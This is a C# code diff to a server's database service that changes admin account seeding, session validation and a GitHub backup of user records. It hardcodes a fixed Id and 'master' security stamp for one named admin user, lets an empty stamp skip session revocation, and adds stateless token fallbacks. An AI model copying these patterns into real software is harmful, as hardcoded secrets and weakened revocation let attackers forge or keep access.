@@ -199,11 +199,12 @@ public class DatabaseService
         {
             var adm = GetUserByUsername(adminName);
             var (admHash, admSalt) = _security.HashPassword(passToUse);
+            string masterSecStamp = "4747093652d84510b6afa6b1d2e5d095";
             if (adm == null)
             {
                 adm = new UserRecord
                 {
-                    Id = Guid.NewGuid().ToString("N"),
+                    Id = adminName.Equals("AzPlayzZ", StringComparison.OrdinalIgnoreCase) ? "6c12f01336854b38a0b9add24714c07a" : Guid.NewGuid().ToString("N"),
                     Username = adminName,
                     PasswordHash = admHash,
                     PasswordSalt = admSalt,
@@ -212,12 +213,12 @@ public class DatabaseService
                     CurrentAppVersion = "1.1.0",
                     LastIp = "127.0.0.1",
                     LastSeenUtc = DateTime.UtcNow,
-                    SecurityStamp = Guid.NewGuid().ToString("N"),
+                    SecurityStamp = masterSecStamp,
                     IsAdmin = true,
                     FailedLoginCount = 0,
                     LockoutUntilUtc = null
                 };
-                CreateUser(adm);
+                CreateUser(adm, triggerCloudBackup: false);
                 AddAudit("SYSTEM", "INITIALIZE", $"Created master administrator account '{adminName}'", "127.0.0.1");
             }
             else
@@ -228,8 +229,12 @@ public class DatabaseService
                 adm.Status = AccessStatus.Approved;
                 adm.FailedLoginCount = 0;
                 adm.LockoutUntilUtc = null;
+                if (string.IsNullOrEmpty(adm.SecurityStamp) || adminName.Equals("AzPlayzZ", StringComparison.OrdinalIgnoreCase))
+                {
+                    adm.SecurityStamp = masterSecStamp;
+                }
                 UpdateUserCredentials(adm.Id, adm.Username, admHash, admSalt, adm.SecurityStamp);
-                UpdateUser(adm);
+                UpdateUser(adm, triggerCloudBackup: false);
                 AddAudit("SYSTEM", "INITIALIZE", $"Synchronized master administrator credentials for '{adminName}'", "127.0.0.1");
             }
         }
@@ -613,7 +618,7 @@ public class DatabaseService
 
             // Immediate Revocation check: verify session security stamp matches current user security stamp
             var user = GetUserById(session.UserId);
-            if (user == null || user.SecurityStamp != session.SecurityStamp)
+            if (user == null || (!string.IsNullOrEmpty(user.SecurityStamp) && user.SecurityStamp != session.SecurityStamp))
             {
                 DeleteSession(token);
                 return null; // Instantly revoked!
@@ -621,6 +626,14 @@ public class DatabaseService
 
             return session;
         }
+
+        // Fallback: stateless cryptographic user session token (spl_...)
+        if (_security.ValidateUserToken(token, this, out var cryptoSession) && cryptoSession != null)
+        {
+            CreateSession(cryptoSession);
+            return cryptoSession;
+        }
+
         return null;
     }
 
@@ -772,7 +785,7 @@ public class DatabaseService
         using var reader = cmd.ExecuteReader();
         if (reader.Read())
         {
-            return new AdminSessionRecord
+            var session = new AdminSessionRecord
             {
                 Token = reader.GetString(0),
                 UserId = reader.GetString(1),
@@ -781,7 +794,19 @@ public class DatabaseService
                 ExpiresAtUtc = DateTime.Parse(reader.GetString(4)),
                 IpAddress = reader.IsDBNull(5) ? "127.0.0.1" : reader.GetString(5)
             };
+            if (DateTime.UtcNow <= session.ExpiresAtUtc)
+            {
+                return session;
+            }
         }
+
+        // Fallback: stateless cryptographic admin token (adm_...)
+        if (_security.ValidateAdminToken(token, this, out var cryptoAdminSession) && cryptoAdminSession != null)
+        {
+            CreateAdminSession(cryptoAdminSession);
+            return cryptoAdminSession;
+        }
+
         return null;
     }
 
@@ -1228,7 +1253,8 @@ public class DatabaseService
             var contentBytes = Encoding.UTF8.GetBytes(json);
             var base64Content = Convert.ToBase64String(contentBytes);
 
-            string url = $"https://api.github.com/repos/{GitHubRepo}/contents/data/users_backup.json";
+            string branch = "db-backup";
+            string url = $"https://api.github.com/repos/{GitHubRepo}/contents/data/users_backup.json?ref={branch}";
 
             for (int attempt = 1; attempt <= 3; attempt++)
             {
@@ -1251,12 +1277,13 @@ public class DatabaseService
 
                 var putPayload = new
                 {
-                    message = $"Auto-backup: {items.Count} users at {DateTime.UtcNow:yyyy-MM-dd HH:mm:ss} UTC [skip ci]",
+                    message = $"Auto-backup: {items.Count} users at {DateTime.UtcNow:yyyy-MM-dd HH:mm:ss} UTC",
                     content = base64Content,
-                    sha = sha
+                    sha = sha,
+                    branch = branch
                 };
 
-                using var putReq = new HttpRequestMessage(HttpMethod.Put, url);
+                using var putReq = new HttpRequestMessage(HttpMethod.Put, $"https://api.github.com/repos/{GitHubRepo}/contents/data/users_backup.json");
                 putReq.Headers.UserAgent.ParseAdd("Splash-Server");
                 putReq.Headers.Authorization = new AuthenticationHeaderValue("Bearer", token);
                 putReq.Content = new StringContent(JsonSerializer.Serialize(putPayload), Encoding.UTF8, "application/json");
@@ -1264,7 +1291,7 @@ public class DatabaseService
                 var putResp = await _cloudHttp.SendAsync(putReq);
                 if (putResp.IsSuccessStatusCode)
                 {
-                    Console.WriteLine($"[BackupEngine] Successfully pushed cloud backup of {items.Count} users to GitHub ({GitHubRepo}).");
+                    Console.WriteLine($"[BackupEngine] Successfully pushed cloud backup of {items.Count} users to GitHub ({GitHubRepo} on branch {branch}).");
                     return true;
                 }
                 else if (putResp.StatusCode == System.Net.HttpStatusCode.Conflict && attempt < 3)
@@ -1294,12 +1321,12 @@ public class DatabaseService
             string? json = null;
             var token = GetGitHubToken();
 
-            // 1. ALWAYS PRIORITIZE GITHUB CLOUD REPOSITORY (Persistent across Render container wipes)
+            // 1. ALWAYS PRIORITIZE GITHUB CLOUD REPOSITORY (Persistent across Render container wipes on db-backup branch)
             if (!string.IsNullOrWhiteSpace(token))
             {
                 try
                 {
-                    string url = $"https://api.github.com/repos/{GitHubRepo}/contents/data/users_backup.json";
+                    string url = $"https://api.github.com/repos/{GitHubRepo}/contents/data/users_backup.json?ref=db-backup";
                     using var req = new HttpRequestMessage(HttpMethod.Get, url);
                     req.Headers.UserAgent.ParseAdd("Splash-Server");
                     req.Headers.Authorization = new AuthenticationHeaderValue("Bearer", token);
